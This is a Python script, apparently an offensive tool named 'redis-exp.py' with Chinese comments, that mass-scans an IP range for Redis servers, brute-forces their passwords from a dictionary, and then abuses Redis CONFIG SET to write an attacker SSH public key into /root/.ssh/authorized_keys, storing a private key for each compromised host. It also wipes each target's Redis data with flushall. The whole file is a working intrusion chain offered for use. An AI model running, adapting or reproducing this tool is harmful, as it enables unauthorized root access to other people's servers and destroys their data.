#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Project : pythonProject4
# @IDE: PyCharm 2022.3.2
# @Time : 2023/5/3 16:50
# @Author : jin
# @Email : 295588728@qq.com
# @File : redis-exp.py
# @Description :


"""
1、通过文件指定ip段
2、遍历文件中的ip段，扫描6379端口是否开放，并存到列表中
3、开始使用字典对开放6379端口的ip逐个进行密码爆破
4、针对爆破成功的主机进行公钥的exp
5、修改靶机中的redis密码防止他人利用
6、输出靶机ip及对应的私钥文件
"""

############ 计时器 ############
from datetime import datetime, timezone, timedelta
############ 扫描阶段 ############
import socket
import redis
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from redis.exceptions import ConnectionError, TimeoutError, ResponseError, AuthenticationError
############ 公钥利用阶段 ############
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import shutil


############ 计时器 ############
def get_current_time():
    utc_plus_8 = timezone(timedelta(hours=8))
    current_time = datetime.now(utc_plus_8)
    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S %Z")
    return formatted_time


############ 扫描阶段 ############
def generate_ips(network_address, netmask):
    network = ipaddress.IPv4Network(f'{network_address}/{netmask}', strict=False)
    return [str(ip) for ip in network.hosts()]


def check_open_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Set a timeout for the connection attempt
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"[+] Port {port} is open")
            ip_find.append(f"{ip}:{port}")

    except Exception as e:
        print(f"[-] Error checking port {port}: {e}")
    finally:
        sock.close()


def scan_port(ip, start_port, end_port):
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(check_open_port, ip, port) for port in range(start_port, end_port + 1)]
        for future in as_completed(futures):
            future.result()


############ 爆破阶段 ############

def redis_no_pass_check(ip, port, password=None):
    # r_ip = ip
    # r_port = port
    try:
        r = redis.Redis(host=ip, port=port, password=password, db=7)
        r.info()
    except redis.exceptions.ConnectionError:
        print(f"[-] {ip}:{port} Connection or Authentication Failed")
        ip_target.append(f"{ip}:{port}")
        return False
    except redis.exceptions.InvalidResponse:
        print(f"[-] {ip}:{port} Protocol Error")
    else:
        print("[+] Target", ip, "is Nopassword !!!")
        ip_nopass.append(f"{ip}:{port}")
        return True

def connect_to_redis(host, port, password, db=0, socket_timeout=10):
    try:
        r = redis.Redis(host=host, port=port, password=password, db=db, socket_timeout=socket_timeout)
        # Ping the server to check if the connection is established
        r.ping()

    except TimeoutError:
        print(f"————主机地址 {host} 连接超时————")
        return True

    except redis.exceptions.AuthenticationError:
        # print(f"————不合法的密码，密码 {password} 认证失败————")
        # print("redis.exceptions.AuthenticationError: invalid password")
        return False

    except redis.exceptions.ConnectionError:
        print(f"主机地址 {host} 连接失败，远程主机强迫关闭了一个现有的连接")
        print(f"疑似IP被风控, 尝试更换网络环境")
        return True

    except ResponseError:
        # print(f"————不合法的用户名和密码对 {password} 或者用户已经被禁止————")
        # print("WRONGPASS invalid username-password pair or user is disabled.")
        return False

    else:
        print("Connected to Redis server successfully.")
        print("》》》 爆破成功 《《《")
        print(f"主机地址: {host} 端口: {port}")
        print(f"密码: {password}")
        # Perform Redis operations here
        r.close()
        ip_find_pass.append(f"{host}:{port}:{password}")
        return True

def redis_pass_blast(hostname, port, pass_dic):
    # 打开密码字典
    with open(pass_dic) as passwords:
        passwords = passwords.readlines()

        # 遍历字典密码
        for password in passwords:
            password = password.strip()  # strip 去掉换行符
            # print(password)
            status = connect_to_redis(hostname, port, password)
            if status:
                break


############ 公钥利用阶段 ############

def copy_and_rename(src_file, dest_file):
    try:
        shutil.copy2(src_file, dest_file, follow_symlinks=True)
        print(f"[*]File copied and renamed successfully: {src_file} -> {dest_file}")
    except FileNotFoundError:
        print(f"[-]Error: {src_file} not found.")
    except OSError as e:
        print(f"[-]Error copying and renaming file: {e}")

def generate_ssh_key_pair(private_key_path, public_key_path, key_size=2048):
    # Generate a private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend()
    )

    # Serialize the private key to PEM format
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Write the private key to the specified file
    with open(private_key_path, 'wb') as f:
        f.write(pem_private_key)

    # Generate the public key from the private key
    public_key = private_key.public_key()

    # Serialize the public key to OpenSSH format
    pem_public_key = public_key.public_bytes(
        encoding=serialization.Encoding.OpenSSH,
        format=serialization.PublicFormat.OpenSSH
    )

    # Write the public key to the specified file
    with open(public_key_path, 'wb') as f:
        f.write(pem_public_key)
    print(f"[+]SSH key pair generated successfully.")
    print(f"[*]Private key: {private_key_path}")
    print(f"[*]Public key: {public_key_path}")


############ 主程序 ############

def start_scan(ip_range, netmask):
    print("—————————开始扫描:"+get_current_time()+"——————————")

    ip_addresses = generate_ips(ip_range, netmask)

    for target_ip in ip_addresses:
        # target_ip = "192.168.200.167"  # Replace with the IP address you want to scan
        start_port = 6378
        end_port = 6379

        print(f"[*]Scanning IP {target_ip} for open ports...")
        scan_port(target_ip, start_port, end_port)
        # print("Scan completed.")
    print("—————————结束扫描:" + get_current_time() + "——————————")
    print("————————————————————扫描结果如下———————————————————————")
    for ip in ip_find:
        print(ip)
    print("—————————————————————————————————————————————————————")

def start_blast(pass_dic):
    print("——————检测无密码的redis:" + get_current_time() + "——————")
    for check_ips in ip_find:
        check_ip = check_ips[0:-5]
        check_port = int(check_ips[-4:])
        redis_no_pass_check(check_ip, check_port)
    print("——————爆破有密码的redis:" + get_current_time() + "——————")
    for blast_ips in ip_target:
        blast_ip = blast_ips[0:-5]
        blast_port = int(blast_ips[-4:])
        redis_pass_blast(blast_ip, blast_port, pass_dic)
    print("————————爆破结果如下:" + get_current_time() + "——————————")
    print(ip_find_pass)

def write_public_key():

    for findpass_ips in ip_find_pass:
        findpass_ip = findpass_ips[0:15]
        findpass_port = int(findpass_ips[16:20])
        findpass_pass = findpass_ips[21:]

        print("————————————开始公钥exp———————————————")

        r_ip = findpass_ip
        r_port = findpass_port
        password = findpass_pass

        try:
            r = redis.StrictRedis(host=r_ip, port=r_port, db=7, password=password, socket_timeout=2)
            r.flushall()

            # 生成公钥
            private_key_path = 'keypair/private_key.txt'
            public_key_path = 'keypair/authorized_keys'
            generate_ssh_key_pair(private_key_path, public_key_path)

            # 添加换行符防止读取公钥不全
            try:
                with open(public_key_path, 'r') as f:
                    ssh_key = f.read()
                    ssh_key = '\n\n' + ssh_key + '\n\n'
            except:
                print("Public_key File Read Failed")
                exit()

            # 开始利用
            r.set('crack', ssh_key)
            r.config_set('dir', '/root/.ssh/')
            r.config_set('dbfilename', 'authorized_keys')
            r.save()
            print("[+] ++++ Target", r_ip, "Write SSH Public_key Success!!! ++++")

            # 重命名私钥
            old_private_key = private_key_path
            new_private_key = f'keypair/{findpass_ip}-private.pem'
            copy_and_rename(old_private_key, new_private_key)

            # 重命名公钥
            old_public_key = public_key_path
            new_public_key = f'keypair/{findpass_ip}-public.pub'
            copy_and_rename(old_public_key, new_public_key)
            print("————————————————————————————————————")

            # 清除缓存在redis的公钥键值对
            r.flushall()

        except:
            print("[-] ---- Target", r_ip, "Write SSH Public_key Failed... ----")
            print("————————————————————————————————————")
            pass

if __name__ == '__main__':

    # 定义全局变量
    ip_find = []
    ip_nopass = []
    ip_target = []
    ip_find_pass = []

    # 靶机范围
    ip_range = "192.168.200.0"
    netmask = 27
    start_scan(ip_range, netmask)

    # 字典文件
    pass_dic = "password/top500.txt"
    start_blast(pass_dic)

    # 写公钥
    write_public_key()